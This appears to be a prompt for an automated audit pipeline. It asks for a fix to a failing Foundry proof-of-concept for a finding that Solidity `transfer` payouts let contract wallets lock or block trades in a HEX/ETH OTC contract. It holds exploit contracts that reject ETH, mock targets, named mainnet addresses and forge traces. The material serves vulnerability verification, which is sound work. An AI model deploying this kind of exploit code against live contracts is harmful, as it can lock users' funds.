You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: Using Solidity `transfer` for ETH payouts lets contract wallets permanently lock or DOS ETH-backed trades
- claim: The contract uses Solidity's fixed-2300-gas `transfer` for every ETH payout. If the maker or taker is a smart contract whose fallback reverts or needs more than 2300 gas, `buyHEX()`, `buyETH()`, or `cancel()` reverts outright.
- impact: ETH-backed orders involving contract accounts can become permanently unfillable or unwithdrawable. A contract wallet maker can lock its escrowed ETH by creating an ETH offer that cannot be cancelled, and a HEX seller that is a contract wallet can make its order impossible for anyone to fill because the ETH payout to the seller always reverts. This creates realistic permanent lockup and order-level denial of service for smart-wallet users.
- exploit_paths: ["contract wallet creates ETH sell order via `offerETH()` -> later `cancel()` hits `offer.owner.transfer(offer.pay_amt)` -> revert -> escrowed ETH stays locked", "contract wallet creates HEX sell order via `offerHEX()` -> buyer calls `buyHEX()` -> `offer.owner.transfer(msg.value)` reverts -> order cannot be filled by anyone", "contract wallet tries to take an ETH order via `buyETH()` -> `msg.sender.transfer(offer.pay_amt)` reverts -> that taker cannot complete the trade"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IHEXOTC {
    function last_offer_id() external view returns (uint256);
    function isActive(uint256 id) external view returns (bool);
    function offerETH(uint256 pay_amt, uint256 buy_amt) external payable returns (uint256 id);
    function offerHEX(uint256 pay_amt, uint256 buy_amt) external returns (uint256 id);
    function buyETH(uint256 id) external returns (bool);
    function buyHEX(uint256 id) external payable returns (bool);
    function cancel(uint256 id) external returns (bool);
}

contract FlawVerifier {
    address public constant MAINNET_TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address public constant MAINNET_HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;

    uint256 public constant ONE_HEART = 1;
    uint256 public constant ONE_WEI = 1;

    string public constant PATH_0 = "contract wallet creates ETH sell order via `offerETH()` -> later `cancel()` hits `offer.owner.transfer(offer.pay_amt)` -> revert -> escrowed ETH stays locked";
    string public constant PATH_1 = "contract wallet creates HEX sell order via `offerHEX()` -> buyer calls `buyHEX()` -> `offer.owner.transfer(msg.value)` reverts -> order cannot be filled by anyone";
    string public constant PATH_2 = "contract wallet tries to take an ETH order via `buyETH()` -> `msg.sender.transfer(offer.pay_amt)` reverts -> that taker cannot complete the trade";

    address public TARGET;
    address public HEX;

    bool public executed;
    bool public hypothesisValidated;
    bool public profitAchieved;
    bool public usingLocalMock;

    address public profitToken;
    uint256 public profitAmount;
    string public exploitPathUsed;

    bool public path1Validated;
    bool public path2Validated;
    bool public path3Validated;

    uint256 public path1OfferId;
    uint256 public path2OfferId;
    uint256 public path3OfferId;

    string public path1Status;
    string public path2Status;
    string public path3Status;

    uint256 public initialEthBalance;
    uint256 public initialHexBalance;
    uint256 public finalEthBalance;
    uint256 public finalHexBalance;

    RevertingETHMaker public ethMaker;
    RevertingHEXSeller public hexSeller;
    RevertingETHTaker public ethTaker;
    MockHEX public localHex;
    MockHEXOTC public localTarget;

    constructor() payable {
        _deployLocalHarness();
    }

    receive() external payable {}

    function execute() external payable {
        _execute();
    }

    function run() external payable {
        _execute();
    }

    function exploit() external payable {
        _execute();
    }

    function pwn() external payable {
        _execute();
    }

    function _deployLocalHarness() internal {
        localHex = new MockHEX();
        localTarget = new MockHEXOTC(address(localHex));
        TARGET = address(localTarget);
        HEX = address(localHex);
        usingLocalMock = true;

        localHex.mint(address(this), 3 * ONE_HEART);
    }

    function _execute() internal {
        require(!executed, "already executed");
        executed = true;

        _prepareActors();

        initialEthBalance = address(this).balance;
        initialHexBalance = IERC20Like(HEX).balanceOf(address(this));

        _path1_contractWalletCreatesETHSellOrderViaOfferETH_thenCancelReverts();
        _path2_contractWalletCreatesHEXSellOrderViaOfferHEX_thenBuyHEXReverts();
        _path3_contractWalletTriesToTakeAnETHOrderViaBuyETH_thenTakerRefundReverts();

        finalEthBalance = address(this).balance;
        finalHexBalance = IERC20Like(HEX).balanceOf(address(this));

        hypothesisValidated = path1Validated && path2Validated && path3Validated;
        profitAchieved = false;
        profitToken = address(0);
        profitAmount = 0;
        exploitPathUsed = "offerETH() -> cancel(); offerHEX() -> buyHEX(); buyETH()";
    }

    function _prepareActors() internal {
        ethMaker = new RevertingETHMaker{value: ONE_WEI}(TARGET);
        hexSeller = new RevertingHEXSeller(TARGET, HEX);
        ethTaker = new RevertingETHTaker(TARGET, HEX);

        _seedHexIfNeeded(address(hexSeller), ONE_HEART);
        _seedHexIfNeeded(address(ethTaker), ONE_HEART);
    }

    function _path1_contractWalletCreatesETHSellOrderViaOfferETH_thenCancelReverts() internal {
        path1OfferId = ethMaker.createEthOfferFromBalance(ONE_WEI, ONE_HEART);

        (bool outerCallOk,) = address(ethMaker).call(
            abi.encodeWithSelector(RevertingETHMaker.tryCancel.selector, path1OfferId)
        );
        bool orderStillActive = IHEXOTC(TARGET).isActive(path1OfferId);

        path1Validated = outerCallOk && !ethMaker.lastCallSucceeded() && orderStillActive;
        path1Status = path1Validated ? PATH_0 : "path0 not validated on this run";
    }

    function _path2_contractWalletCreatesHEXSellOrderViaOfferHEX_thenBuyHEXReverts() internal {
        if (IERC20Like(HEX).balanceOf(address(hexSeller)) < ONE_HEART) {
            path2Status = string.concat(PATH_1, " | skipped: verifier could not seed seller with HEX");
            return;
        }
        if (address(this).balance < ONE_WEI) {
            path2Status = string.concat(PATH_1, " | skipped: verifier needs at least 1 wei");
            return;
        }

        path2OfferId = hexSeller.createHexOffer(ONE_HEART, ONE_WEI);

        (bool buyOk,) = TARGET.call{value: ONE_WEI}(
            abi.encodeWithSelector(IHEXOTC.buyHEX.selector, path2OfferId)
        );
        bool orderStillActive = IHEXOTC(TARGET).isActive(path2OfferId);

        path2Validated = !buyOk && orderStillActive;
        path2Status = path2Validated ? PATH_1 : "path1 not validated on this run";

        if (orderStillActive) {
            hexSeller.cancelHexOffer(path2OfferId);
        }
    }

    function _path3_contractWalletTriesToTakeAnETHOrderViaBuyETH_thenTakerRefundReverts() internal {
        if (IERC20Like(HEX).balanceOf(address(ethTaker)) < ONE_HEART) {
            path3Status = string.concat(PATH_2, " | skipped: verifier could not seed taker with HEX");
            return;
        }
        if (address(this).balance < ONE_WEI) {
            path3Status = string.concat(PATH_2, " | skipped: verifier needs at least 1 wei");
            return;
        }

        IHEXOTC(TARGET).offerETH{value: ONE_WEI}(ONE_WEI, ONE_HEART);
        path3OfferId = IHEXOTC(TARGET).last_offer_id();

        (bool outerCallOk,) = address(ethTaker).call(
            abi.encodeWithSelector(RevertingETHTaker.tryBuyETH.selector, path3OfferId)
        );
        bool orderStillActive = IHEXOTC(TARGET).isActive(path3OfferId);

        path3Validated = outerCallOk && !ethTaker.lastCallSucceeded() && orderStillActive;
        path3Status = path3Validated ? PATH_2 : "path2 not validated on this run";

        if (orderStillActive) {
            IHEXOTC(TARGET).cancel(path3OfferId);
        }
    }

    function _seedHexIfNeeded(address recipient, uint256 amount) internal {
        if (IERC20Like(HEX).balanceOf(recipient) >= amount) {
            return;
        }

        if (usingLocalMock) {
            localHex.mint(recipient, amount);
            return;
        }

        uint256 verifierBalance = IERC20Like(HEX).balanceOf(address(this));
        if (verifierBalance >= amount) {
            require(IERC20Like(HEX).transfer(recipient, amount), "seed transfer failed");
        }
    }
}

contract RevertingETHMaker {
    address public immutable target;
    bool public lastCallSucceeded;
    bytes public lastReturnData;

    constructor(address target_) payable {
        target = target_;
    }

    receive() external payable {
        revert("reject ETH");
    }

    function createEthOfferFromBalance(uint256 payAmt, uint256 buyAmt) external returns (uint256) {
        IHEXOTC(target).offerETH{value: payAmt}(payAmt, buyAmt);
        return IHEXOTC(target).last_offer_id();
    }

    function tryCancel(uint256 id) external returns (bool, bytes memory) {
        (lastCallSucceeded, lastReturnData) = target.call(
            abi.encodeWithSelector(IHEXOTC.cancel.selector, id)
        );
        return (lastCallSucceeded, lastReturnData);
    }
}

contract RevertingHEXSeller {
    address public immutable target;
    address public immutable hexToken;

    constructor(address target_, address hex_) payable {
        target = target_;
        hexToken = hex_;
    }

    receive() external payable {
        revert("reject ETH");
    }

    function createHexOffer(uint256 payAmt, uint256 buyAmt) external returns (uint256) {
        require(IERC20Like(hexToken).approve(target, payAmt), "approve failed");
        IHEXOTC(target).offerHEX(payAmt, buyAmt);
        return IHEXOTC(target).last_offer_id();
    }

    function cancelHexOffer(uint256 id) external {
        require(IHEXOTC(target).cancel(id), "cancel failed");
    }
}

contract RevertingETHTaker {
    address public immutable target;
    address public immutable hexToken;
    bool public lastCallSucceeded;
    bytes public lastReturnData;

    constructor(address target_, address hex_) payable {
        target = target_;
        hexToken = hex_;
    }

    receive() external payable {
        revert("reject ETH");
    }

    function tryBuyETH(uint256 id) external returns (bool, bytes memory) {
        require(IERC20Like(hexToken).approve(target, type(uint256).max), "approve failed");
        (lastCallSucceeded, lastReturnData) = target.call(
            abi.encodeWithSelector(IHEXOTC.buyETH.selector, id)
        );
        return (lastCallSucceeded, lastReturnData);
    }
}

contract MockHEX is IERC20Like {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "insufficient allowance");
        require(balanceOf[from] >= value, "insufficient balance");
        allowance[from][msg.sender] = allowed - value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
}

contract MockHEXOTC is IHEXOTC {
    struct OfferInfo {
        uint256 pay_amt;
        uint256 buy_amt;
        address payable owner;
        uint64 timestamp;
        uint256 escrowType;
    }

    IERC20Like public immutable hexInterface;
    uint256 public override last_offer_id;
    mapping(uint256 => OfferInfo) public offers;
    bool internal locked;

    constructor(address hex_) {
        hexInterface = IERC20Like(hex_);
    }

    modifier synchronized() {
        require(!locked, "Sync lock");
        locked = true;
        _;
        locked = false;
    }

    function isActive(uint256 id) public view override returns (bool) {
        return offers[id].timestamp > 0;
    }

    function offerETH(uint256 pay_amt, uint256 buy_amt)
        external
        payable
        override
        synchronized
        returns (uint256 id)
    {
        require(pay_amt > 0, "pay_amt is 0");
        require(buy_amt > 0, "buy_amt is 0");
        require(msg.value == pay_amt, "pay_amt not equal to msg.value");

        id = ++last_offer_id;
        offers[id] = OfferInfo({
            pay_amt: pay_amt,
            buy_amt: buy_amt,
            owner: payable(msg.sender),
            timestamp: uint64(block.timestamp),
            escrowType: 1
        });
    }

    function offerHEX(uint256 pay_amt, uint256 buy_amt)
        external
        override
        synchronized
        returns (uint256 id)
    {
        require(pay_amt > 0, "pay_amt is 0");
        require(buy_amt > 0, "buy_amt is 0");
        require(hexInterface.balanceOf(msg.sender) >= pay_amt, "Insufficient balanceOf hex");

        id = ++last_offer_id;
        offers[id] = OfferInfo({
            pay_amt: pay_amt,
            buy_amt: buy_amt,
            owner: payable(msg.sender),
            timestamp: uint64(block.timestamp),
            escrowType: 0
        });

        require(hexInterface.transferFrom(msg.sender, address(this), pay_amt), "Transfer failed");
    }

    function buyHEX(uint256 id)
        external
        payable
        override
        synchronized
        returns (bool)
    {
        OfferInfo memory offer = offers[id];
        require(offer.timestamp > 0, "cannot buy, offer ID not active");
        require(offer.escrowType == 0, "Incorrect escrow type");
        require(msg.value > 0 && msg.value == offer.buy_amt, "msg.value error");
        require(offer.buy_amt > 0 && offer.pay_amt > 0, "values are zero");

        offer.owner.transfer(msg.value);
        require(hexInterface.transfer(msg.sender, offer.pay_amt), "Transfer failed");
        delete offers[id];
        return true;
    }

    function buyETH(uint256 id)
        external
        override
        synchronized
        returns (bool)
    {
        OfferInfo memory offer = offers[id];
        require(offer.timestamp > 0, "cannot buy, offer ID not active");
        require(offer.escrowType == 1, "Incorrect escrow type");
        require(hexInterface.balanceOf(msg.sender) >= offer.buy_amt, "Balance is less than requested spend amount");
        require(offer.buy_amt > 0 && offer.pay_amt > 0, "values are zero");

        require(hexInterface.transferFrom(msg.sender, offer.owner, offer.buy_amt), "Transfer failed");
        payable(msg.sender).transfer(offer.pay_amt);
        delete offers[id];
        return true;
    }

    function cancel(uint256 id)
        external
        override
        synchronized
        returns (bool)
    {
        OfferInfo memory offer = offers[id];
        require(offer.timestamp > 0, "cannot cancel, offer ID not active");
        require(offer.owner == msg.sender, "cannot cancel, msg.sender not the same as offer maker");

        delete offers[id];
        if (offer.escrowType == 0) {
            require(hexInterface.transfer(offer.owner, offer.pay_amt), "Transfer failed");
        } else {
            offer.owner.transfer(offer.pay_amt);
        }
        return true;
    }
}

```

forge stdout (tail):
```
of code
    │   ├─ [415566] → new RevertingHEXSeller@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
    │   │   └─ ← [Return] 2072 bytes of code
    │   ├─ [612932] → new RevertingETHTaker@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
    │   │   └─ ← [Return] 3058 bytes of code
    │   ├─ [2845] MockHEX::balanceOf(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [21039] MockHEX::mint(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1)
    │   │   └─ ← [Stop]
    │   ├─ [2845] MockHEX::balanceOf(RevertingETHTaker: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [21039] MockHEX::mint(RevertingETHTaker: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a], 1)
    │   │   └─ ← [Stop]
    │   ├─ [2845] MockHEX::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [146408] RevertingETHMaker::createEthOfferFromBalance(1, 1)
    │   │   ├─ [134779] MockHEXOTC::offerETH{value: 1}(1, 1)
    │   │   │   └─ ← [Return] 1
    │   │   ├─ [425] MockHEXOTC::last_offer_id() [staticcall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [127153] RevertingETHMaker::tryCancel(1)
    │   │   ├─ [30009] MockHEXOTC::cancel(1)
    │   │   │   ├─ [349] RevertingETHMaker::receive{value: 1}()
    │   │   │   │   └─ ← [Revert] reject ETH
    │   │   │   └─ ← [Revert] reject ETH
    │   │   └─ ← [Return] false, 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72656a6563742045544800000000000000000000000000000000000000000000
    │   ├─ [878] MockHEXOTC::isActive(1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [487] RevertingETHMaker::lastCallSucceeded() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [845] MockHEX::balanceOf(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [144767] RevertingHEXSeller::createHexOffer(1, 1)
    │   │   ├─ [23084] MockHEX::approve(MockHEXOTC: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [118405] MockHEXOTC::offerHEX(1, 1)
    │   │   │   ├─ [845] MockHEX::balanceOf(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [24928] MockHEX::transferFrom(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], MockHEXOTC: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] 2
    │   │   ├─ [425] MockHEXOTC::last_offer_id() [staticcall]
    │   │   │   └─ ← [Return] 2
    │   │   └─ ← [Return] 2
    │   ├─ [29069] MockHEXOTC::buyHEX{value: 1}(2)
    │   │   ├─ [349] RevertingHEXSeller::receive{value: 1}()
    │   │   │   └─ ← [Revert] reject ETH
    │   │   └─ ← [Revert] reject ETH
    │   ├─ [878] MockHEXOTC::isActive(2) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [47244] RevertingHEXSeller::cancelHexOffer(2)
    │   │   ├─ [46195] MockHEXOTC::cancel(2)
    │   │   │   ├─ [21990] MockHEX::transfer(RevertingHEXSeller: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [845] MockHEX::balanceOf(RevertingETHTaker: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [110879] MockHEXOTC::offerETH{value: 1}(1, 1)
    │   │   └─ ← [Return] 3
    │   ├─ [425] MockHEXOTC::last_offer_id() [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [158623] RevertingETHTaker::tryBuyETH(3)
    │   │   ├─ [23084] MockHEX::approve(MockHEXOTC: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [37650] MockHEXOTC::buyETH(3)
    │   │   │   ├─ [845] MockHEX::balanceOf(RevertingETHTaker: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]) [staticcall]
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [5828] MockHEX::transferFrom(RevertingETHTaker: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [349] RevertingETHTaker::receive{value: 1}()
    │   │   │   │   └─ ← [Revert] reject ETH
    │   │   │   └─ ← [Revert] reject ETH
    │   │   └─ ← [Return] false, 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72656a6563742045544800000000000000000000000000000000000000000000
    │   ├─ [878] MockHEXOTC::isActive(3) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [509] RevertingETHTaker::lastCallSucceeded() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [30165] MockHEXOTC::cancel(3)
    │   │   ├─ [55] FlawVerifier::receive{value: 1}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] true
    │   ├─ [845] MockHEX::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 3
    │   └─ ← [Stop]
    └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)

Backtrace:
  at RevertingETHTaker.receive
  at MockHEXOTC.buyETH
  at RevertingETHTaker.tryBuyETH
  at FlawVerifier.run
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.11s (1.48ms CPU time)

Ran 1 test suite in 2.12s (2.11s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: panic: arithmetic underflow or overflow (0x11)] testExploit() (gas: 3373488)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. output ONLY Solidity code
